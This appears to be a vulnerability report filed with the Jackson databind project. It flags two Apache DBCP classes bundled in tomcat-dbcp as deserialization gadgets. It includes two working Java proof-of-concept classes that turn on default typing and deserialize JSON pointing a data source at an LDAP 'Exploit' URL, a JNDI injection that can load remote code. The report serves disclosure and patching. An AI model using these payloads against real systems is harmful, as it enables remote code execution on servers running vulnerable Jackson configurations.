Report by: @cowtowncoder
Received: 2020-12-22
Evaluation:

  Library

  https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-dbcp

  is notable enough (101 deps) to qualify

---------------------------------------------------------------------------

Vulnerability description:

Bundle of Tomcat "tomcat-dbcp" embeds Apache DBCP 2.x classes
known to be vulnerable (from databind#2986):

org.apache.tomcat.dbcp.dbcp2.datasources.PerUserPoolDataSource
org.apache.tomcat.dbcp.dbcp2.datasources.SharedPoolDataSource

---------------------------------------------------------------------------

Vulnerability proof:

Pom.xml:

<dependencies>
    <dependency>
        <groupId>org.apache.tomcat</groupId>
        <artifactId>tomcat-dbcp</artifactId>
        <version>10.0.0</version>
    </dependency>
</dependencies>


public class POC {
  public static void main(String[] args) throws Exception {
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();
    mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);
    String json = "[\"org.apache.tomcat.dbcp.dbcp2.datasources.PerUserPoolDataSource\",
{\"dataSourceName\":\"ldap://127.0.0.1:1399/Exploit\"}]";
    Object obj = mapper.readValue(json, Object.class);
    mapper.writeValueAsString(obj);
  }
}

public class POC {
  public static void main(String[] args) throws Exception {
    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();
    mapper.configure(SerializationFeature.FAIL_ON_EMPTY_BEANS, false);
    String json = "[\"org.apache.tomcat.dbcp.dbcp2.datasources.SharedPoolDataSource\",
{\"dataSourceName\":\"ldap://127.0.0.1:1099/Exploit\"}]";
    Object obj = mapper.readValue(json, Object.class);
    mapper.writeValueAsString(obj);
  }
}
